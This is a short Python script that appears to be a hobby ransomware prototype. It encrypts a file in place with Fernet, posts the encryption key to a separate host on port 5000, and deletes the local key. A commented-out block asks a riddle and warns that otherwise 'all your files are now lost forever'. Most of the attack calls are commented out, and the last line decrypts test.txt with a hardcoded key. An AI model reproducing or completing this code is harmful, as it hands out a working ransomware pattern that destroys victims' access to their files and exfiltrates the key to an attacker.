# import required module
from cryptography.fernet import Fernet
import requests
import os

def send_encryption_key():
    url = "http://192.168.1.53:5000/upload"
    file_path = "filekey.key"

    with open(file_path, 'rb') as f:
        response = requests.post(url, files={'file': f})

    print(response.text)

# key generation
key = Fernet.generate_key()

def encrypt_file(original_file, key):
    # string the key in a file
    with open('filekey.key', 'wb') as filekey:
        filekey.write(key)

    # opening the key
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()

    # using the generated key
    fernet = Fernet(key)

    # opening the original file to encrypt
    with open(original_file, 'rb') as file:
        original = file.read()
        
    # encrypting the file
    encrypted = fernet.encrypt(original)

    # opening the file in write mode and 
    # writing the encrypted data
    with open(original_file, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)
  
def decrypt_file(file, key):
    # using the key
    fernet = Fernet(key)
    
    # opening the encrypted file
    with open(file, 'rb') as enc_file:
        encrypted = enc_file.read()
    
    # decrypting the file
    decrypted = fernet.decrypt(encrypted)
    
    # opening the file in write mode and
    # writing the decrypted data
    with open(file, 'wb') as dec_file:
        dec_file.write(decrypted)

# encrypt_file("test.txt", key)
# send_encryption_key()
# os.remove("filekey.key")
#answer = input("What is the meaning of life? ")
#if answer == "coffee":
#    print("Correct, files will now be decrypted.")
#    decrypt_file("test.txt", key)
#    print("Files successfully decrypted.")
#else:
#    print("Incorrect, all your files are now lost forever.")
decrypt_file("test.txt", "I3s1WCJHT-exrvzSvYFz0ou0KAIa_yZbo0SmVc18Hzs=")